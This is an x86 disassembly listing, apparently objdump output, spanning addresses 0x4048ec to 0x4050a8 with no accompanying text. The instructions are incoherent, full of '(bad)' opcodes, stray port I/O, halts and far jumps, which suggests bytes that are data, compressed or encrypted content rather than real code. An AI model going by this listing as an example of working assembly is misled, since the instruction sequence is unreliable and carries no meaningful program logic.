  4048ec:	fidivr WORD PTR [edi]
  4048ee:	mov    eax,0x207411c6
  4048f3:	cld    
  4048f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048f5:	(bad)  
  4048f6:	jmp    0x28a9:0x29c646c8
  4048fd:	lea    ebp,[esi]
  4048ff:	mov    al,0x50
  404901:	ds gs push ebp
  404904:	repnz adc bh,al
  404907:	dec    esp
  404908:	sahf   
  404909:	cmp    eax,0x202c07ef
  40490e:	test   eax,0xe80e331d
  404913:	xor    edx,DWORD PTR fs:[ebx-0x3112b75d]
  40491a:	rol    edi,1
  40491c:	xchg   ebx,eax
  40491d:	test   al,0x64
  40491f:	in     al,dx
  404920:	pop    esi
  404921:	lahf   
  404922:	xchg   edx,eax
  404923:	pop    eax
  404924:	adc    ecx,edx
  404926:	mov    eax,ds:0x9c2bee0
  40492b:	jge    0x404948
  40492d:	fld    DWORD PTR [ebp+0x2d]
  404930:	int    0x76
  404932:	jbe    0x404959
  404934:	loop   0x4049a5
  404936:	mov    ds:0x712840e4,al
  40493b:	(bad)  
  40493c:	mov    ecx,0x4d3489f8
  404941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404942:	cmp    eax,0xdacd73d5
  404947:	cmc    
  404948:	sub    al,BYTE PTR [ebp+eiz*4+0x7f]
  40494c:	imul   esp,DWORD PTR [ebp-0x50b8bc8e],0xffffff95
  404953:	dec    edi
  404954:	icebp  
  404955:	inc    edx
  404956:	(bad)  
  404957:	adc    dh,BYTE PTR [eax+0x64]
  40495a:	sub    al,0x58
  40495c:	sub    dh,BYTE PTR [edx-0x6a588a67]
  404962:	or     eax,0xb4a2bfb4
  404967:	dec    esi
  404968:	aaa    
  404969:	stos   DWORD PTR es:[edi],eax
  40496a:	adc    ebx,ecx
  40496c:	push   eax
  40496d:	test   BYTE PTR [esi-0x75],bh
  404970:	call   0x2090:0x20bd0d24
  404977:	jge    0x404975
  404979:	jl     0x40491b
  40497b:	pop    ds
  40497c:	mov    DWORD PTR [edx-0x123b5ae9],ecx
  404982:	mov    cl,0x62
  404984:	or     BYTE PTR [eax+ecx*4],0x1c
  404988:	xor    ah,bl
  40498a:	xor    edi,DWORD PTR [eax+0x7b071c09]
  404990:	pop    edi
  404991:	and    cl,ch
  404993:	in     al,dx
  404994:	sbb    ecx,esi
  404996:	inc    edx
  404997:	ds push 0xcf9af540
  40499d:	test   BYTE PTR [edx+ebx*4-0x55],cl
  4049a1:	sbb    al,0x33
  4049a3:	push   ss
  4049a4:	add    BYTE PTR [esi-0x49],bh
  4049a7:	jmp    0x40494c
  4049a9:	loope  0x4049e6
  4049ab:	mov    ebp,0x29fa2899
  4049b0:	xchg   esi,eax
  4049b1:	xor    al,BYTE PTR [ebp-0x1394f917]
  4049b7:	stc    
  4049b8:	and    ah,BYTE PTR [ebx+0x442b5588]
  4049be:	inc    edi
  4049bf:	adc    al,0x65
  4049c1:	out    dx,al
  4049c2:	popa   
  4049c3:	cmp    edi,eax
  4049c5:	xor    ebx,DWORD PTR [edi+0x2c]
  4049c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049c9:	(bad)  
  4049cb:	(bad)  
  4049cc:	stc    
  4049cd:	lods   eax,DWORD PTR ds:[esi]
  4049ce:	ret    
  4049cf:	sub    dl,BYTE PTR [ecx+0x45]
  4049d2:	xchg   ebx,eax
  4049d3:	cmp    bh,BYTE PTR [ecx]
  4049d5:	xor    eax,0xe1dc8962
  4049da:	pop    es
  4049db:	ds gs je 0x4049e3
  4049df:	mov    dl,cl
  4049e1:	inc    BYTE PTR [ebp-0x6d]
  4049e4:	ficom  WORD PTR es:[edi+eiz*8-0x1a]
  4049e9:	inc    ebp
  4049eb:	and    BYTE PTR [edi+0x7d6df9b0],0x9d
  4049f2:	sbb    dh,BYTE PTR [esi-0x2d]
  4049f5:	mov    eax,ds:0x7232e5ef
  4049fa:	push   cs
  4049fb:	out    dx,eax
  4049fc:	jecxz  0x4049ec
  4049fe:	adc    ah,BYTE PTR [ebp+0x7f]
  404a01:	push   0x72f0f362
  404a06:	or     DWORD PTR [edx+0x33],edx
  404a09:	sub    al,0xfe
  404a0c:	hlt    
  404a0d:	adc    DWORD PTR [edx-0x1c27bac1],ecx
  404a13:	das    
  404a14:	fisttp WORD PTR [ecx-0x4c3485b5]
  404a1a:	xchg   ebp,eax
  404a1b:	sub    BYTE PTR [edi-0x4bd93fdb],dl
  404a21:	or     BYTE PTR [esi],ch
  404a23:	test   eax,0x457485eb
  404a28:	std    
  404a29:	xchg   ebp,eax
  404a2a:	jmp    0xa13c205
  404a2f:	addr16 pop es
  404a31:	cmp    edi,DWORD PTR [ebp-0x49]
  404a34:	retf   
  404a35:	and    BYTE PTR [eax-0x2962b062],cl
  404a3b:	in     al,0x6
  404a3d:	sbb    DWORD PTR [ecx],edi
  404a3f:	dec    ebx
  404a40:	pop    ebp
  404a41:	hlt    
  404a42:	and    esp,DWORD PTR [edx]
  404a44:	retf   
  404a45:	adc    esi,ebp
  404a47:	(bad)  
  404a48:	push   edi
  404a49:	sub    cl,dh
  404a4b:	push   ecx
  404a4c:	mov    DWORD PTR [esi+ebx*2],edx
  404a4f:	sbb    DWORD PTR [eax],ebp
  404a51:	out    0x46,eax
  404a53:	mov    al,ds:0x7e9715e2
  404a58:	mov    cl,0x6a
  404a5a:	das    
  404a5b:	mov    esp,ecx
  404a5d:	fwait
  404a5e:	std    
  404a5f:	popa   
  404a60:	lahf   
  404a61:	pop    ss
  404a62:	pushf  
  404a63:	dec    edi
  404a64:	icebp  
  404a65:	loopne 0x404a29
  404a67:	dec    eax
  404a68:	push   es
  404a69:	loop   0x404a3a
  404a6b:	lods   eax,DWORD PTR ds:[esi]
  404a6c:	les    ebp,FWORD PTR [ebx-0x4d]
  404a6f:	out    0xdf,al
  404a71:	leave  
  404a72:	cmc    
  404a73:	add    BYTE PTR [ebx],bh
  404a75:	adc    DWORD PTR [esi+edx*2+0x5f4ee683],esp
  404a7c:	out    0xa6,eax
  404a7e:	ss jmp 0xcb02a845
  404a84:	push   ecx
  404a85:	in     eax,dx
  404a86:	pop    ebx
  404a87:	repnz imul esp,edx,0x219cf332
  404a8e:	adc    DWORD PTR [edx+0x2ad13a83],0xffffffe6
  404a95:	xchg   edi,eax
  404a96:	adc    ebp,DWORD PTR [ebx]
  404a98:	mov    edx,0x8e232ec2
  404a9d:	xchg   esp,eax
  404a9e:	xchg   edx,eax
  404a9f:	mov    esi,0xaf8b91f4
  404aa4:	or     BYTE PTR [edx+0x3beb35a9],ah
  404aaa:	(bad)  
  404aab:	(bad)  
  404aac:	fdivr  QWORD PTR [ebp-0x44]
  404aaf:	in     eax,0xec
  404ab1:	jb     0x404b13
  404ab3:	bound  ebp,QWORD PTR [ebx]
  404ab5:	add    cl,cl
  404ab7:	push   ecx
  404ab8:	xor    al,0x34
  404aba:	xchg   esi,eax
  404abb:	cmp    eax,0x5798e827
  404ac0:	int    0xb1
  404ac2:	or     al,0x8a
  404ac4:	in     al,dx
  404ac5:	jne    0x404aeb
  404ac7:	mov    eax,ds:0xc633d96
  404acc:	in     eax,0x94
  404ace:	jmp    0x404af9
  404ad0:	retf   0xb323
  404ad3:	in     eax,0x13
  404ad5:	add    eax,0x759e026d
  404ada:	dec    esi
  404adb:	loope  0x404b1f
  404add:	fist   WORD PTR [edi-0x13]
  404ae0:	enter  0x1859,0xe6
  404ae4:	inc    ebx
  404ae5:	jb     0x404a6b
  404ae7:	aam    0xd5
  404ae9:	leave  
  404aea:	xchg   ecx,eax
  404aeb:	cs repnz retf 0x220d
  404af0:	test   al,0x4
  404af2:	jge    0x404b22
  404af4:	aad    0x80
  404af6:	sbb    BYTE PTR [ebx+0x1a9b20fb],0xde
  404afd:	push   ss
  404afe:	push   0x49545b33
  404b03:	fsub   st(0),st
  404b05:	xchg   esi,eax
  404b06:	inc    edx
  404b08:	sub    cl,BYTE PTR gs:[edx-0x5b8732f9]
  404b0f:	rcl    DWORD PTR [ebx],cl
  404b11:	pusha  
  404b12:	fimul  DWORD PTR [edi+esi*4-0x3502fed4]
  404b19:	ret    0xb881
  404b1c:	adc    al,0xff
  404b1e:	mov    ah,0xec
  404b20:	(bad)  
  404b21:	outs   dx,BYTE PTR ds:[esi]
  404b22:	xchg   cl,bl
  404b24:	not    DWORD PTR [eax+0x5b3f8d55]
  404b2a:	pop    edx
  404b2b:	xor    al,0x4c
  404b2d:	mov    eax,esi
  404b2f:	mov    WORD PTR ds:0xf43faf48,?
  404b35:	sub    al,0xf
  404b37:	shl    DWORD PTR [ebx+0x7d1d9909],cl
  404b3d:	iret   
  404b3e:	xlat   BYTE PTR gs:[ebx]
  404b40:	lahf   
  404b41:	add    ecx,DWORD PTR [edi+0x54]
  404b44:	mov    dh,0x37
  404b46:	stc    
  404b47:	shl    BYTE PTR [ebx-0x2f8bef82],cl
  404b4d:	sbb    eax,eax
  404b4f:	in     al,0xc
  404b51:	mov    ebx,0xe6bb0e4a
  404b57:	or     BYTE PTR [ebx-0x18],0x63
  404b5b:	xchg   esp,eax
  404b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b5d:	fstp   QWORD PTR ds:0x3ac26ee3
  404b63:	cmp    BYTE PTR ds:0x490b19a2,bl
  404b69:	xchg   edi,esp
  404b6b:	adc    al,0xe8
  404b6d:	inc    ebp
  404b6e:	push   ds
  404b6f:	sub    eax,0x1c75b409
  404b74:	xchg   ebp,eax
  404b75:	jno    0x404b92
  404b77:	pop    es
  404b78:	gs pop eax
  404b7a:	jae    0x404b75
  404b7c:	xchg   ebp,eax
  404b7d:	fs fadd st,st(7)
  404b80:	xchg   BYTE PTR [eax-0x3440fa14],ch
  404b86:	add    BYTE PTR [ebp-0x5b],0x7b
  404b8a:	or     BYTE PTR [ebx],ah
  404b8c:	fldcw  WORD PTR [edi+0x39]
  404b8f:	xchg   edx,eax
  404b90:	mov    ebp,0x62eaebc8
  404b95:	push   ebp
  404b96:	cmp    DWORD PTR [edi+edi*4],esi
  404b99:	or     DWORD PTR [ebx],ecx
  404b9b:	loopne 0x404bf8
  404b9d:	ja     0x404b7f
  404b9f:	mov    ebx,0x70e90f04
  404ba4:	pop    edi
  404ba5:	xor    eax,esp
  404ba7:	adc    al,0x4
  404ba9:	addr16 jne 0x404bd9
  404bac:	retf   0x3863
  404baf:	ds and cl,bh
  404bb2:	imul   dh
  404bb4:	or     bh,BYTE PTR [ebx+0x28]
  404bb7:	es push edx
  404bb9:	mov    ?,WORD PTR [ecx+eiz*1]
  404bbc:	mov    ds:0x1774ffd0,al
  404bc1:	les    ebx,FWORD PTR [ebx+edi*8]
  404bc4:	or     eax,0xb2fbe344
  404bc9:	fcom   QWORD PTR [edx-0x15b56fb1]
  404bcf:	(bad)  
  404bd0:	inc    eax
  404bd1:	imul   ebx,DWORD PTR [ebx+0x68],0xda22187b
  404bd8:	out    0xab,eax
  404bda:	sar    DWORD PTR [esi],1
  404bdc:	xor    dl,BYTE PTR [edi-0x6b]
  404bdf:	ds std 
  404be1:	adc    bh,BYTE PTR [edx-0x3a]
  404be4:	std    
  404be5:	or     BYTE PTR [eax-0x35],dl
  404be8:	mov    dh,0x98
  404bea:	sub    edx,ebx
  404bec:	and    bh,dh
  404bee:	dec    edx
  404bef:	mov    bl,0x2
  404bf1:	test   BYTE PTR [edx+esi*4+0x52],dh
  404bf5:	cmp    eax,0x7ade09e8
  404bfa:	sub    eax,0x72474d5b
  404bff:	mov    dl,0x49
  404c01:	aaa    
  404c02:	sub    al,0xdb
  404c04:	leave  
  404c05:	fsubr  DWORD PTR [edi+eiz*8+0x795f37cf]
  404c0c:	xchg   ebx,eax
  404c0d:	addr16 push esi
  404c0f:	sub    ecx,DWORD PTR [ecx-0x17]
  404c12:	or     BYTE PTR [ecx+ecx*8+0x53],0x7f
  404c17:	(bad)  
  404c18:	sub    ah,BYTE PTR [ecx]
  404c1a:	xor    DWORD PTR [edi],ebx
  404c1c:	mov    esi,0x4ae229a5
  404c21:	test   DWORD PTR ds:0x8b289841,esi
  404c27:	mov    eax,0x988a9142
  404c2c:	mov    eax,0xa33d41d0
  404c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c32:	das    
  404c33:	push   ebp
  404c34:	xchg   esi,eax
  404c35:	xchg   ecx,eax
  404c36:	sahf   
  404c37:	adc    edi,esp
  404c39:	out    0x48,al
  404c3b:	sti    
  404c3c:	jns    0x404c50
  404c3e:	shr    BYTE PTR [edi+esi*2],cl
  404c41:	push   0x977f599d
  404c46:	pop    ds
  404c47:	mov    ch,0xf7
  404c49:	jo     0x404c38
  404c4b:	(bad)
  404c4e:	xor    ah,dl
  404c50:	scas   al,BYTE PTR es:[edi]
  404c51:	sbb    edx,DWORD PTR [ebx]
  404c53:	inc    esi
  404c54:	call   0xecf1:0x25218ad3
  404c5b:	adc    ebp,DWORD PTR [esi]
  404c5d:	loop   0x404c19
  404c5f:	(bad)  
  404c60:	fst    st(2)
  404c62:	add    eax,0x85632f30
  404c67:	pop    ss
  404c68:	sbb    BYTE PTR [eax],ah
  404c6a:	arpl   WORD PTR [edi-0x3e],sp
  404c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c6e:	pop    ecx
  404c6f:	pop    ebx
  404c70:	mov    DWORD PTR [edi-0x18],esi
  404c73:	rol    ecx,0x8e
  404c76:	mov    al,0xce
  404c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c79:	or     al,0xe3
  404c7b:	push   es
  404c7c:	inc    ebp
  404c7d:	pop    eax
  404c7e:	push   edi
  404c7f:	aad    0xaa
  404c81:	push   ebp
  404c82:	retf   
  404c83:	adc    BYTE PTR [ebp+0x701c81dd],dl
  404c89:	jae    0x404c82
  404c8b:	retf   
  404c8c:	shl    BYTE PTR [edx+eax*2],1
  404c8f:	scas   al,BYTE PTR es:[edi]
  404c90:	xchg   esi,eax
  404c91:	rcr    BYTE PTR [ecx-0x315e916b],cl
  404c97:	sti    
  404c98:	adc    edi,DWORD PTR [edi]
  404c9a:	bound  esi,QWORD PTR [edx]
  404c9c:	sub    al,0x19
  404c9e:	(bad)  
  404c9f:	sar    BYTE PTR [edi],1
  404ca1:	pop    ds
  404ca2:	cdq    
  404ca3:	xor    dh,dl
  404ca5:	mov    ah,0x71
  404ca7:	add    eax,0x16e69d08
  404cac:	sbb    cl,BYTE PTR [edi-0x2120c77]
  404cb2:	jno    0x404cc4
  404cb4:	adc    al,0xa1
  404cb6:	test   al,0x3f
  404cb8:	inc    edx
  404cb9:	popa   
  404cba:	iret   
  404cbb:	shl    DWORD PTR [ebx],0x64
  404cbe:	inc    edx
  404cbf:	pop    ebx
  404cc0:	nop
  404cc1:	std    
  404cc2:	inc    edx
  404cc3:	ja     0x404d38
  404cc5:	ins    DWORD PTR es:[edi],dx
  404cc6:	and    eax,0xeacf5205
  404ccb:	push   ecx
  404ccc:	retf   
  404ccd:	sub    bh,0xf1
  404cd0:	ins    DWORD PTR es:[edi],dx
  404cd1:	and    edi,DWORD PTR [edi-0x60]
  404cd4:	adc    al,0xec
  404cd6:	in     al,dx
  404cd7:	inc    esp
  404cd8:	jae    0x404c90
  404cda:	inc    edi
  404cdb:	sub    dl,BYTE PTR [ecx*4+0x6cd780ff]
  404ce2:	xchg   ecx,eax
  404ce3:	arpl   WORD PTR [edx+0x53],bp
  404ce6:	push   ebx
  404ce7:	mov    esp,0xe29c0129
  404cec:	cld    
  404ced:	aam    0xd1
  404cef:	fwait
  404cf0:	xchg   esp,eax
  404cf1:	stos   BYTE PTR es:[edi],al
  404cf2:	stos   BYTE PTR es:[edi],al
  404cf3:	call   0xdac2fa2d
  404cf8:	stos   BYTE PTR es:[edi],al
  404cf9:	sbb    eax,0x4e0be14d
  404cfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cff:	fwait
  404d00:	iret   
  404d01:	ja     0x404d2d
  404d03:	retf   
  404d04:	cmp    ecx,esp
  404d06:	push   esi
  404d07:	(bad)  
  404d08:	retf   0x1454
  404d0b:	and    BYTE PTR [ebx-0x75],0x4b
  404d0f:	and    eax,0xa2f5c170
  404d14:	and    eax,0x5cc5e14b
  404d19:	push   es
  404d1a:	cmc    
  404d1b:	xor    eax,0x68ac1fab
  404d20:	not    BYTE PTR [eax-0x80]
  404d23:	push   cs
  404d24:	sbb    ebx,DWORD PTR ds:0x18d66daa
  404d2a:	rol    DWORD PTR [esi],1
  404d2c:	aaa    
  404d2d:	fsub   QWORD PTR [edi+0x5630438c]
  404d33:	mov    eax,gs
  404d35:	or     ah,BYTE PTR [eax]
  404d37:	ffree  st(6)
  404d39:	aad    0x21
  404d3b:	cmp    ch,BYTE PTR [ecx]
  404d3d:	sbb    esp,DWORD PTR [eax]
  404d3f:	push   ds
  404d40:	gs jp  0x404cc9
  404d43:	out    dx,al
  404d44:	xchg   edi,eax
  404d45:	aas    
  404d46:	adc    ebp,DWORD PTR [ebx-0x26ebe705]
  404d4c:	sbb    DWORD PTR [edx],eax
  404d4e:	pop    ecx
  404d4f:	jno    0x404d92
  404d51:	iret   
  404d52:	push   ebp
  404d53:	or     ebx,DWORD PTR [eax+ebx*1]
  404d56:	scas   eax,DWORD PTR es:[edi]
  404d57:	sbb    al,0xc4
  404d59:	jne    0x404d8c
  404d5b:	or     al,0x95
  404d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d5e:	push   es
  404d5f:	mov    ds:0xcf548f1b,eax
  404d64:	push   0x5
  404d66:	xchg   ebx,eax
  404d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d68:	jne    0x404d3a
  404d6a:	cmp    al,0x8
  404d6c:	xchg   esi,edi
  404d6e:	jo     0x404d15
  404d70:	neg    esp
  404d72:	fistp  QWORD PTR [edx]
  404d74:	fld    QWORD PTR [esi-0x3c]
  404d77:	call   0x47a0:0x16b4bac4
  404d7e:	mov    edx,0x199cf9f0
  404d83:	fs (bad) 
  404d85:	jno    0x404d12
  404d87:	mov    eax,0x3aacbaf3
  404d8c:	daa    
  404d8d:	xor    eax,0xbbe3af75
  404d92:	test   BYTE PTR [ecx+0x49],ch
  404d95:	jle    0x404da3
  404d97:	std    
  404d98:	pop    eax
  404d99:	xor    eax,0xda718e90
  404d9e:	jp     0x404d39
  404da0:	push   edi
  404da1:	in     al,0xb2
  404da3:	push   edi
  404da4:	pop    ds
  404da5:	xchg   BYTE PTR [eax-0x15bf3157],bl
  404dab:	inc    esi
  404dac:	xor    DWORD PTR [ebp+0x3b7ac225],esi
  404db2:	add    dl,ch
  404db4:	jmp    0xf9aad86c
  404db9:	dec    edx
  404dba:	xchg   edi,eax
  404dbb:	or     edx,ecx
  404dbd:	lods   al,BYTE PTR ds:[esi]
  404dbe:	lods   al,BYTE PTR ds:[esi]
  404dbf:	adc    DWORD PTR [eax+0xc],edi
  404dc2:	jbe    0x404e3d
  404dc4:	push   cs
  404dc5:	aas    
  404dc6:	clc    
  404dc7:	rol    BYTE PTR [edi+0x19],1
  404dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dcb:	fs daa 
  404dcd:	(bad)  
  404dce:	cmp    eax,0xf00cce5b
  404dd3:	les    edi,FWORD PTR [esi+0x53075dae]
  404dd9:	mov    ecx,0xc7796bd0
  404dde:	add    ebp,ebx
  404de0:	mov    ebp,gs
  404de2:	sahf   
  404de3:	mov    dl,0x93
  404de5:	sbb    eax,0x6c20847b
  404dea:	arpl   WORD PTR [edx],bp
  404dec:	in     al,dx
  404ded:	loop   0x404d9a
  404def:	in     eax,dx
  404df0:	test   ah,dh
  404df2:	xor    eax,0x3cc26b50
  404df7:	outs   dx,DWORD PTR ds:[esi]
  404df8:	pushf  
  404df9:	jb     0x404df8
  404dfb:	iret   
  404dfc:	in     al,dx
  404dfd:	ret    0xe13
  404e00:	jne    0x404e7f
  404e02:	jns    0x404e80
  404e04:	mov    ds,eax
  404e06:	mov    cl,0x88
  404e08:	icebp  
  404e09:	dec    esi
  404e0a:	loope  0x404e2a
  404e0c:	ror    BYTE PTR [esi+eax*2],0x7c
  404e10:	jg     0x1904391c
  404e16:	(bad)  
  404e18:	cmc    
  404e19:	push   0x5589eeb1
  404e1e:	cmp    edi,eax
  404e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e21:	ja     0x404e97
  404e23:	pop    esp
  404e24:	int3   
  404e25:	or     DWORD PTR [ecx],esp
  404e27:	lods   al,BYTE PTR ds:[esi]
  404e28:	xor    ch,cl
  404e2a:	sub    eax,0x323ea7c9
  404e2f:	int    0xfc
  404e31:	cmp    bl,cl
  404e33:	mov    dl,0xa3
  404e35:	out    0x5b,eax
  404e37:	int    0x47
  404e39:	fild   WORD PTR [ecx]
  404e3b:	jmp    DWORD PTR [edi+0xf]
  404e3e:	and    eax,0x4a378443
  404e43:	dec    ecx
  404e44:	(bad)  
  404e45:	int3   
  404e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e47:	mov    bh,0x46
  404e49:	sub    BYTE PTR [ebp+0x5c],bh
  404e4c:	sub    BYTE PTR [esi],al
  404e4e:	mov    esi,0x1ee5e41d
  404e53:	jge    0x404de4
  404e55:	cmp    eax,0xb1830c3f
  404e5a:	test   DWORD PTR [ecx],edx
  404e5c:	test   eax,0x72c74c00
  404e61:	xor    dh,bl
  404e63:	add    edx,esp
  404e65:	mov    edi,0x676804c2
  404e6a:	or     DWORD PTR [edi+0x3baf24a4],0xffffff98
  404e71:	test   eax,0x7d062f84
  404e76:	or     esi,0x8f1eebc2
  404e7c:	inc    edi
  404e7d:	or     eax,0x16d40554
  404e82:	mov    eax,ds:0x8fc5d689
  404e87:	sub    DWORD PTR [ecx-0x47],ecx
  404e8a:	mov    edi,esi
  404e8c:	fdivr  st,st(2)
  404e8e:	mov    DWORD PTR [ecx+0x6f48513d],ecx
  404e94:	jle    0x404f11
  404e96:	not    ah
  404e98:	inc    ecx
  404e99:	xor    BYTE PTR [eax],0xc7
  404e9c:	and    DWORD PTR [esi+0x6ecb42c1],edx
  404ea2:	pusha  
  404ea3:	mov    DWORD PTR [ebp-0x5a],esi
  404ea6:	(bad)  
  404ea7:	lahf   
  404ea8:	cmp    eax,0x76718d98
  404ead:	adc    eax,0x9219b709
  404eb2:	mov    al,ds:0x2788c38c
  404eb7:	retf   0x701e
  404eba:	stc    
  404ebb:	stos   DWORD PTR es:[edi],eax
  404ebc:	adc    BYTE PTR [edi+0x6d],bh
  404ebf:	cmp    esp,DWORD PTR [ebx]
  404ec1:	sub    edi,ebx
  404ec3:	sub    BYTE PTR [esi*4-0x39b5d0c9],0xed
  404ecb:	and    eax,DWORD PTR [eax-0x10]
  404ece:	sti    
  404ecf:	pusha  
  404ed0:	daa    
  404ed1:	jns    0x404f2d
  404ed3:	ss xchg esp,eax
  404ed5:	imul   ecx,DWORD PTR [eax],0xfbfb62f7
  404edb:	mov    esp,0x4144cd2d
  404ee0:	push   edi
  404ee1:	inc    edi
  404ee2:	xor    edx,DWORD PTR [edi]
  404ee4:	sti    
  404ee5:	(bad)  
  404ee6:	and    ebp,DWORD PTR [ebx+ecx*2]
  404ee9:	or     al,0x51
  404eeb:	sub    BYTE PTR [ebp-0x70289671],dh
  404ef1:	mov    edi,0xeed07c0b
  404ef6:	dec    dl
  404ef8:	mov    esp,0xba3ac609
  404efd:	call   0xc543:0x757466a
  404f04:	mov    ecx,0x3336f1be
  404f09:	call   0x4d4f:0xd2af4bad
  404f10:	test   ebx,0x42749b74
  404f16:	inc    esp
  404f17:	out    0xf6,al
  404f19:	mov    ds,WORD PTR [edx+edx*2+0x6f]
  404f1d:	test   DWORD PTR [edi],0x3cc2d144
  404f23:	test   DWORD PTR [edx-0x416a50e2],edx
  404f29:	inc    esi
  404f2a:	clc    
  404f2b:	daa    
  404f2c:	push   esi
  404f2d:	push   edx
  404f2e:	adc    al,0x4d
  404f30:	mov    ch,0xde
  404f32:	cmp    edx,edx
  404f34:	out    0x31,al
  404f36:	into   
  404f37:	xor    ah,al
  404f39:	push   ecx
  404f3a:	stos   DWORD PTR es:[edi],eax
  404f3b:	popf   
  404f3c:	sub    DWORD PTR [esi+0x6b281071],esp
  404f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f44:	lahf   
  404f45:	sbb    eax,0xa752c67
  404f4a:	les    ebx,FWORD PTR [eax+0xf994fb7]
  404f50:	(bad)  
  404f51:	(bad)  
  404f52:	repz adc DWORD PTR [edx],ebx
  404f55:	jbe    0x404f61
  404f57:	cmp    bl,BYTE PTR [edx+0xb]
  404f5a:	mov    ah,0x42
  404f5c:	xchg   edx,eax
  404f5d:	ret    0x15a1
  404f60:	in     al,0x1d
  404f62:	movnti DWORD PTR [eax+0x7d8c5904],ecx
  404f69:	add    DWORD PTR [ebp-0x15],ebx
  404f6c:	add    BYTE PTR [esi-0x1a],ch
  404f6f:	xor    eax,0x3c9ade74
  404f74:	jbe    0x404f22
  404f76:	fadd   QWORD PTR [ecx+0x20]
  404f79:	mov    cl,0x44
  404f7b:	fstp   TBYTE PTR [esi]
  404f7d:	mov    cl,0x65
  404f7f:	ss push esi
  404f81:	ins    DWORD PTR es:[edi],dx
  404f82:	dec    ebx
  404f83:	pusha  
  404f84:	test   DWORD PTR [ebp+0x454150b0],esp
  404f8a:	xor    al,0xbe
  404f8c:	repnz adc eax,0x3afb450f
  404f92:	jno    0x404f9a
  404f94:	adc    al,0xaa
  404f96:	xchg   ecx,eax
  404f97:	nop
  404f98:	push   es
  404f99:	aaa    
  404f9a:	loopne 0x404f85
  404f9c:	cmc    
  404f9d:	inc    edi
  404f9e:	fisttp QWORD PTR [edi+edi*4+0x558e67e7]
  404fa5:	(bad)  
  404fa6:	pop    eax
  404fa7:	or     dl,BYTE PTR [eax-0x6]
  404faa:	test   eax,0xada5ca37
  404faf:	rcr    DWORD PTR [ebp+0xf37ba7],0x8e
  404fb6:	jno    0x404f52
  404fb8:	out    dx,eax
  404fb9:	fidiv  WORD PTR [ebx+0x6b]
  404fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fbd:	in     al,0x32
  404fbf:	sub    BYTE PTR [esi+0x6c],0xd7
  404fc3:	sub    eax,0x5c13b3a6
  404fc8:	adc    eax,0x50a3f5a1
  404fcd:	iret   
  404fce:	popf   
  404fcf:	dec    eax
  404fd0:	cmp    BYTE PTR [ebp-0x4bb793af],dh
  404fd6:	mov    al,ds:0x36d0687c
  404fdb:	cmp    esp,edi
  404fdd:	cmp    eax,0xb7137a50
  404fe2:	out    dx,eax
  404fe3:	imul   ebx,DWORD PTR [edi],0xffffff87
  404fe6:	push   esp
  404fe7:	sub    al,0xa5
  404fe9:	add    ch,BYTE PTR [edx+0x31]
  404fec:	sbb    BYTE PTR [eax-0x102a6ccd],cl
  404ff2:	retf   
  404ff3:	pop    esp
  404ff4:	mov    BYTE PTR [edi],ch
  404ff6:	push   es
  404ff7:	adc    DWORD PTR [edi+0x56],ecx
  404ffa:	xchg   ebp,eax
  404ffb:	jb     0x405048
  404ffd:	bound  esp,QWORD PTR [edi]
  404fff:	mov    DWORD PTR [esi+ebx*1],ebp
  405002:	in     al,dx
  405003:	js     0x404fc5
  405005:	test   DWORD PTR [ebx-0x2bf05a78],edx
  40500b:	push   cs
  40500c:	cmp    al,0xd8
  40500e:	(bad)  
  40500f:	jmp    0x2ff79a8b
  405014:	xlat   BYTE PTR ds:[ebx]
  405015:	jmp    0x535e020e
  40501a:	mov    ah,0xe6
  40501c:	hlt    
  40501d:	outs   dx,BYTE PTR ds:[esi]
  40501e:	xchg   DWORD PTR [ebx-0x52cc808d],edx
  405024:	into   
  405025:	xchg   esp,eax
  405026:	test   eax,0x7351f622
  40502b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40502c:	mov    al,ds:0x44a31a92
  405031:	or     eax,DWORD PTR [ebp-0x7a]
  405034:	pop    ebx
  405035:	mov    dh,0xc2
  405037:	imul   ecx,edi,0xe4b3f45f
  40503d:	in     eax,0x9a
  40503f:	xor    BYTE PTR [ebp-0xb611a6e],ch
  405045:	adc    bh,BYTE PTR [eax+ebx*4+0x7c2f67f6]
  40504c:	(bad)  
  40504d:	stos   DWORD PTR es:[edi],eax
  40504e:	addr16 out 0x37,al
  405051:	into   
  405052:	call   0xd83a:0x127e1443
  405059:	xchg   ebp,eax
  40505a:	mul    DWORD PTR [edx]
  40505c:	sahf   
  40505d:	out    0xb1,eax
  40505f:	inc    esi
  405060:	dec    esp
  405061:	jno    0x4050d2
  405063:	pop    esp
  405064:	cmp    ch,BYTE PTR [edx-0x3e9833f4]
  40506a:	add    DWORD PTR [edx-0x57],0x63
  40506e:	(bad)  
  40506f:	jmp    0x98e80640
  405074:	adc    eax,DWORD PTR [edx-0xbf1fc21]
  40507a:	add    bh,BYTE PTR [edi+ebx*4+0x3f]
  40507e:	mov    esp,0x2c2ff6c5
  405083:	jp     0x405008
  405085:	add    al,BYTE PTR ds:0x342c7bcf
  40508b:	fs popf 
  40508d:	mov    bl,0xa7
  40508f:	sbb    BYTE PTR [edi],ah
  405091:	rol    DWORD PTR [edx+0x212bb3e6],1
  405097:	dec    ebp
  405098:	stc    
  405099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40509a:	and    BYTE PTR [edx+edi*8+0x28],bh
  40509e:	inc    ecx
  40509f:	clc    
  4050a0:	add    al,0x9c
  4050a2:	cmp    edx,edi
  4050a4:	or     DWORD PTR [eax-0x8],esi
  4050a7:	(bad)  
  4050a8:	loope  0x405113
